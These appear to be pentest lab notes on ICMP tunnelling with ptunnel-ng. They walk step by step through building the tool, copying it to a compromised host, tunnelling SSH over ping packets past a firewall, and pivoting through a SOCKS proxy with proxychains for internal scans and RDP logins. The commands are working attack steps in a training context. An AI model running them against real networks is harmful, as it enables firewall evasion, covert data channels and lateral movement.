**ICMP tunneling** encapsulates TCP traffic inside ICMP Echo Request/Reply packets (ping).  
It is useful when a firewall blocks inbound connections but **allows outbound ICMP traffic**.

If a compromised host can ping an external attacker machine, traffic can be tunneled through ICMP to:

- bypass firewall restrictions
    
- exfiltrate data
    
- create pivot tunnels into internal networks
    

The tool used here is **ptunnel-ng**, which converts ICMP traffic into TCP forwarding.

---

## 1. Installing ptunnel-ng (Attacker Host)

Clone and build the tool:

```bash
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
sudo ./autogen.sh
```

### Optional: Build Static Binary (recommended for transfers)

```bash
sudo apt install automake autoconf -y
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh
```

Static binaries reduce dependency issues on the victim.

---

## 2. Transfer ptunnel-ng to the Compromised Host

From attacker machine:

```bash
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

---

## 3. Start ICMP Tunnel Server (Compromised Host)

Executed **on the pivot/victim machine**:

```bash
sudo ./ptunnel-ng -r10.129.202.64 -R22
```

Explanation:

- `-r` → IP reachable from attacker (pivot host IP)
    
- `-R22` → forward traffic to SSH port 22
    

The victim now listens for ICMP packets and forwards them to SSH locally.

---

## 4. Connect to the Tunnel (Attacker Host)

Run on attacker:

```bash
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

Parameters:

- `-p` → target running ptunnel server
    
- `-l2222` → local port exposed on attacker
    
- traffic to localhost:2222 is encapsulated into ICMP
    

---

## 5. Access SSH Through ICMP Tunnel

```bash
ssh -p2222 -lubuntu 127.0.0.1
```

Flow:

```
SSH → localhost:2222 → ICMP packets → victim → localhost:22
```

If successful, SSH works even when TCP inbound connections are blocked.

---

## 6. Creating a SOCKS Proxy (Dynamic Port Forwarding)

After SSH access through the tunnel:

```bash
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

This creates:

- a **local SOCKS proxy** on attacker
    
- traffic routed through:  
    ICMP tunnel → victim → internal network
    

---

## 7. Pivoting with Proxychains

Configure `/etc/proxychains4.conf`:

```
socks5 127.0.0.1 9050
```

Example internal scan:

```bash
proxychains nmap -sT -sV 172.16.5.19 -p3389
```

Example lateral movement:

```bash
proxychains xfreerdp3 /v:172.16.5.19 /u:user /p:password
```
